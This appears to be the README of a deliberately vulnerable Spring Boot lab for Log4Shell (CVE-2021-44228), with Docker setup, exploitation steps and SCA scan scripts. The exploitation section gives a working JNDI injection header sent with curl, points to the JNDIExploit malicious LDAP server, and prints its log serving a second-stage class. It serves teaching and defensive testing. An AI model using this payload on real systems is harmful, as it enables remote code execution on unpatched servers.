# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## I forked the original repo: what I changed?
- Write script to run SCAN with OWASP Dependency-Check and trivy.
- Updated the README.md to make it more user friendly.
- Changed the Dockerfile to use a more recent base image (openjdk:8-jdk

## Running the application
Oblviously, you should run this application in a safe environment, such as a VM or a Docker container, as it is intentionally vulnerable.
The easiest way to run the vulnerable application is to use the provided Docker image.

Build it:
```bash
docker build -t log4shell-app:latest .
```

Run it:
```shell
docker run --rm -p 8080:8080 --name log4shell-app log4shell-app:latest
```

## 

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528))... 
[Click Here](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to Download the version cached by the Wayback Machine.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server


* Then, trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```

## Software Composition Analysis (SCA) Scans
You can run the following commands to perform SCA scans using OWASP Dependency-Check and Trivy.

### 1. OWASP Dependency-Check
To run the OWASP Dependencie Check scans, execute the following command in the terminal:
```shell
./sca_owasp_dependency_check.sh
```
It will generate a report in the `./sca-odc-reports` directory.

![report_owasp_dependency_check.png](report_owasp_dependency_check.png)

### 2. Trivy
To run the Trivy scans, execute the following command in the terminal:
```shell
./sca_trivy.sh
```
It will generate a report in the `./sca-trivy-reports` directory.

![report_trivy.png](report_trivy.png)

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
https://trivy.dev/
https://owasp.org/www-project-dependency-check/

## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
[@xcesco](https://x.com/xcescoz) 
